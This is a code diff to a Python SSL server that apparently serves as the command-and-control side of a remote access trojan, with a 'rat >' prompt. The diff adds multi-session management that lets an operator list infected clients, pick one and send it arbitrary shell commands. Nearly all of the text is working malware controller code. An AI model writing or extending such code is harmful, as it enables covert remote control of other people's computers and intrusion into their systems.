@@ -6,6 +6,8 @@ import ssl
 from threading import Thread
 from utils.logger import setup_logger
 import json
+from server.sessions import SessionManager
+import sys
 
 logger = setup_logger()
 
@@ -21,17 +23,18 @@ class SSLServer:
         self._context.verify_mode = ssl.CERT_REQUIRED
         self._context.load_cert_chain(server_cert, server_key)
         self._context.load_verify_locations(client_cert)
+        self.sessions = SessionManager()
 
     def connect(self):
 
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
 
             sock.bind((self.host, self.port))
-
             sock.listen(5)
 
             print("Server listening")
             logger.info("Server listening")
+
             while True:
 
                 conn, addr = sock.accept()
@@ -48,6 +51,11 @@ class SSLServer:
 
                     data = sconn.recv(self.chunk_size)
 
+                    if not data:
+                        logger.warning("Client disconnected before sending info")
+                        sconn.close()
+                        continue
+
                     client_info = json.loads(data.decode())
 
                     logger.info(
@@ -58,9 +66,24 @@ class SSLServer:
                         client_info["release"],
                     )
 
+                    session_id = self.sessions.add(
+                        sconn,
+                        client_info,
+                    )
+
+                    logger.info(
+                        "New session %s for %s",
+                        session_id,
+                        client_info["hostname"],
+                    )
+
                     Thread(
                         target=self._handle_client,
-                        args=(sconn,),
+                        args=(
+                            sconn,
+                            client_info,
+                            session_id,
+                        ),
                         daemon=True,
                     ).start()
 
@@ -101,45 +124,99 @@ class SSLServer:
 
             sock.close()
 
-    def _handle_client(self, sock):
+    def _handle_client(self, sock, client_info, session_id):
 
-        logger.info("Client handler started")
+        logger.info(
+            "Handler started for %s (%s)",
+            client_info["hostname"],
+            client_info["os"],
+        )
+
+        sock.settimeout(1)
 
         try:
 
             while True:
 
-                command = input("rat > ")
+                try:
 
-                if not command:
+                    command = input("rat > ").strip()
+
+                    if not command:
+                        continue
+
+                    if command == "exit":
+                        sys.exit(0)
+
+                    if command == "sessions":
+                        self.sessions.list_sessions()
+                        continue
+
+                    if command.startswith("interact"):
+
+                        try:
+                            session_id = int(command.split()[1])
+                            self.sessions.interact(session_id)
+                        except (IndexError, ValueError):
+                            print("Usage: interact <id>")
+                            continue
+
+                    if self.sessions.current_session is None:
+                        print("No session selected")
+                        continue
+
+                    session = self.sessions.sessions[self.sessions.current_session]
+
+                    sock = session["socket"]
+
+                    sock.sendall(command.encode())
+
+                    logger.info(
+                        "Command sent to %s: %s",
+                        client_info["hostname"],
+                        command,
+                    )
+
+                    data = sock.recv(self.chunk_size)
+
+                    if not data:
+                        logger.warning(
+                            "Client disconnected: %s",
+                            client_info["hostname"],
+                        )
+
+                        self.sessions.remove(session_id)
+
+                        break
+
+                    response = data.decode(errors="ignore")
+
+                    print(response)
+
+                except socket.timeout:
+
                     continue
 
-                sock.sendall(command.encode())
+                except (
+                    ConnectionResetError,
+                    BrokenPipeError,
+                ):
 
-                logger.info("Server sent command: %s", command)
-
-                data = sock.recv(self.chunk_size)
-
-                if not data:
-                    logger.warning("Client disconnected")
-
+                    logger.warning(
+                        "Client connection lost: %s",
+                        client_info["hostname"],
+                    )
+                    self.sessions.remove(session_id)
                     break
-
-                response = data.decode(errors="ignore")
-
-                print(response)
-
-                logger.info("Client responded: %s", response)
-
-        except Exception as e:
-
-            logger.error("Client handler error: %s", e)
 
         finally:
 
-            logger.info("Closing client socket")
-
             sock.close()
+
+            logger.info(
+                "Socket closed for %s",
+                client_info["hostname"],
+            )
 
 
 class SSLServerThread(Thread):
